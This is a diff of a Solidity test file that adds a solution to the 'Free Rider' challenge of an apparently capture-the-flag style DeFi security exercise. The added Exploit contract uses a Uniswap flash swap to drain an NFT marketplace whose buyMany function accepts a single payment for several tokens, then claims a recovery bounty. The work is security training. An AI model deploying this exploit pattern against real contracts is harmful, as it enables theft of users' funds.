@@ -123,7 +123,7 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        new Wrapper(marketplace, recoveryManager, uniswapPair);
     }
 
     /**
@@ -145,4 +145,57 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract Wrapper {
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    IUniswapV2Pair uniswapPair;
+
+    constructor(
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        IUniswapV2Pair _uniswapPair
+    ) {
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        uniswapPair = _uniswapPair;
+
+        Exploit ex = new Exploit(_marketplace, _recoveryManager);
+        uniswapPair.swap(15 ether, 0, address(ex), new bytes(1));
+    }
+}
+
+contract Exploit {
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+
+    constructor(FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recoveryManager) {
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        WETH weth = WETH(payable(IUniswapV2Pair(msg.sender).token0()));
+        weth.withdraw(amount0);
+        uint256[] memory ids = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            ids[i] = i;
+        }
+        marketplace.buyMany{value: amount0}(ids);
+        uint256 fee = (amount0 * 3 / 997) + 1;
+        uint256 amountRequired = amount0 + fee;
+        weth.deposit{value: amountRequired}();
+        weth.transfer(msg.sender, amountRequired);
+
+        for (uint256 i = 0; i < 6; i++) {
+            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(tx.origin));
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
+    }
+
+    receive() external payable {}
 }
